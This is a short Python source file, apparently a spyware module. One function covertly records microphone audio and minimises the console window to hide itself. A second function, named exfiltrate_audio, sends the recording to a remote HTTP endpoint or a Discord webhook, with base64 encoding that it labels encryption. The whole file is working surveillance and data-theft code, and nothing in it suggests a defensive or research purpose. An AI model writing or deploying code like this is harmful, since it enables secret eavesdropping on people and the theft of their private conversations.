import pyaudio
import wave
import requests
import base64
import json
import ctypes

def capture_audio(output_path='capture.wav', duration=5, rate=44100, channels=2, format=pyaudio.paInt16, stealth=False, silent=False, testing=False):
    try:
        audio = pyaudio.PyAudio()
        stream = audio.open(format=format, channels=channels, rate=rate, input=True, frames_per_buffer=1024)
        frames = []
        for _ in range(0, int(rate / 1024 * duration)):
            data = stream.read(1024)
            frames.append(data)
        stream.stop_stream()
        stream.close()
        audio.terminate()
        wf = wave.open(output_path, 'wb')
        wf.setnchannels(channels)
        wf.setsampwidth(audio.get_sample_size(format))
        wf.setframerate(rate)
        wf.writeframes(b''.join(frames))
        wf.close()
        if testing:
            print("Audio captured.")
    except Exception as e:
        if testing:
            print(f"Error capturing audio: {e}")

    if silent:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 6)  # Minimize the command window

def exfiltrate_audio(audio_path, target, encrypt=False, stealth=False, silent=False, testing=False):
    try:
        with open(audio_path, 'rb') as f:
            audio_data = f.read()
        if encrypt:
            audio_data = base64.b64encode(audio_data).decode()
        if target.startswith('http'):
            requests.post(target, data={'audio': audio_data})
        elif target.startswith('discord'):
            webhook_url = target
            data = {"content": f"Audio exfiltrated", "files": [("audio.wav", audio_data)]}
            requests.post(webhook_url, files=data)
        elif target == 'file':
            with open('exfiltrated_audio.wav', 'wb') as f:
                f.write(audio_data)
        if testing:
            print(f"Audio exfiltrated to {target}")
    except Exception as e:
        if testing:
            print(f"Error exfiltrating audio: {e}")

    if silent:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 6)  # Minimize the command window